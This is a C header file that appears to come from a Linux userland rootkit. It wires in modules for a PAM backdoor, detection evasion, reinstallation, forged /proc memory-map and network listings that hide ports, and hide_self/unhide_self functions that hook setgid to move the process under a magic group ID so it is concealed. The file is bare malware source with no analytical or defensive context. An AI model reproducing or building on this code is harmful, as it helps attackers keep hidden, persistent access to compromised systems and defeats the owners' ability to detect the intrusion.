#ifndef HIDING_H
#define HIDING_H   

#include "files/files.h"

#ifdef BLOCK_STRINGS
int scary_path(char *string);
int block_strings(char *const argv[]);
#include "evasion/block_strings.c"
#endif

#if defined(DO_EVASIONS) && defined(DO_REINSTALL)
#include "evasion/evasion.h"
#endif

#if defined(HIDE_SELF) && defined(USE_PAM_BD) 
#include "syslog/syslog.h"
#endif

#ifdef FORGE_MAPS
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);
#include "forge_maps.c"
#endif

#ifdef HIDE_PORTS
int is_hidden_port(int port);
FILE *forge_procnet(const char *pathname);
#include "forge_procnet.c"
#include "pcap/pcap.h"
#endif

void _setgid(gid_t gid){
    hook(CSETGID);
    (void)call(CSETGID, gid);
}

void hide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    if(not_user(0) || getgid() == MAGIC_GID) return;
    _setgid(MAGIC_GID);
}

void unhide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    if(not_user(0) || getgid() == 0) return;
    _setgid(0);
}

#endif
